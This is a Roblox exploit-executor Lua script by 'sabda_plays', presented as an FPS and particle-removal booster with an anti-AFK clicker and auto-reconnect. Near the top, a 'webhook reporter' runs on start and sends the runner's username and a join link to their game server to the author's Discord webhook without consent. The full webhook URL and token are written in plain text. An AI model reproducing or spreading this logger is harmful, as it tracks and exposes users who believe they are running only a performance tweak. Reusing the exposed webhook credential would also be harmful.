-- SABDA_PLAYS ANDROID CLOUD - ABSOLUTE PARTICLE NUKE
-- Script by sabda_plays

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local GuiService = game:GetService("GuiService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

-- WEBHOOK REPORTER by sabda_plays
local function SendWebhook()
    local url = "https://discord.com/api/webhooks/1444599598063685797/L8_uoPI0RQpdeolUuGXSJVNxGofgmetV0GnP_9my9pqdklXPSOdOnTKR-jMsuDOzt9aN"
    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Script Executed by sabda_plays",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Username", ["value"] = LP.Name, ["inline"] = true},
                {["name"] = "Server Link", ["value"] = "https://www.roblox.com/games/" .. game.PlaceId .. "/" .. game.JobId, ["inline"] = false}
            },
            ["footer"] = {["text"] = "sabda_plays Logger"}
        }}
    }
    local payload = HttpService:JSONEncode(data)
    request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = payload
    })
end
task.spawn(SendWebhook)

-- 1. AGGRESSIVE AUTO-RECONNECT by sabda_plays
GuiService.ErrorMessageChanged:Connect(function()
    task.wait(15) 
    game:GetService("TeleportService"):Teleport(game.PlaceId, LP)
end)

-- 2. WATERMARK PERMANEN by sabda_plays
local function CreateWatermark()
    local Gui = LP:WaitForChild("PlayerGui")
    if Gui:FindFirstChild("SabdaPlays_WM") then return end
    local ScreenGui = Instance.new("ScreenGui")
    local TextLabel = Instance.new("TextLabel")
    ScreenGui.Name = "SabdaPlays_WM"
    ScreenGui.Parent = Gui
    ScreenGui.ResetOnSpawn = false
    TextLabel.Parent = ScreenGui
    TextLabel.BackgroundTransparency = 1
    TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    TextLabel.Size = UDim2.new(0, 500, 0, 100)
    TextLabel.Font = Enum.Font.LuckiestGuy
    TextLabel.Text = "SCRIPT BY SABDA_PLAYS"
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextSize = 40
    TextLabel.TextTransparency = 0.6
end
CreateWatermark()

-- 3. REAL-TIME PARTICLE DESTROYER by sabda_plays
local function BantaiPartikel(obj)
    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or 
       obj:IsA("Fire") or obj:IsA("Sparkles") or obj:IsA("Beam") or 
       obj:IsA("Explosion") or obj:IsA("Highlight") or obj:IsA("PointLight") or 
       obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
        
        obj.Enabled = false
        task.spawn(function()
            RunService.Heartbeat:Wait()
            obj:Destroy()
        end)
        
    elseif obj:IsA("Decal") or obj:IsA("Texture") then
        obj:Destroy()
        
    elseif obj:IsA("BasePart") then
        obj.Material = Enum.Material.Plastic
        obj.Reflectance = 0
        obj.CastShadow = false
        if obj:IsA("MeshPart") then
            obj.TextureID = ""
        end
    end
end

for _, v in pairs(game:GetDescendants()) do
    BantaiPartikel(v)
end
game.DescendantAdded:Connect(BantaiPartikel)

-- 4. FPS & RENDERING SETTING by sabda_plays
setfpscap(30) 
settings().Rendering.QualityLevel = 1
settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Always

-- 5. MATIIN ANIMASI & LIGHTING TOTAL by sabda_plays
local function StopEverything(char)
    local hum = char:WaitForChild("Humanoid", 10)
    if hum then
        local anim = hum:FindFirstChildOfClass("Animator")
        if anim then anim:Destroy() end
    end
end
if LP.Character then StopEverything(LP.Character) end
LP.CharacterAdded:Connect(StopEverything)

Lighting.GlobalShadows = false
Lighting.Brightness = 0
Lighting.FogEnd = 9e9
for _, v in pairs(Lighting:GetChildren()) do
    v:Destroy()
end

workspace.Terrain.Decoration = false
workspace.Terrain.WaterWaveSize = 0
workspace.Terrain.WaterWaveSpeed = 0

-- 6. ANTI-AFK by sabda_plays
local VirtualUser = game:GetService("VirtualUser")
LP.Idled:Connect(function()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- NOTIFIKASI by sabda_plays
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Script By sabda_plays";
    Text = "jangan lupa follow tiktok: sabda_plays";
    Duration = 10;
})
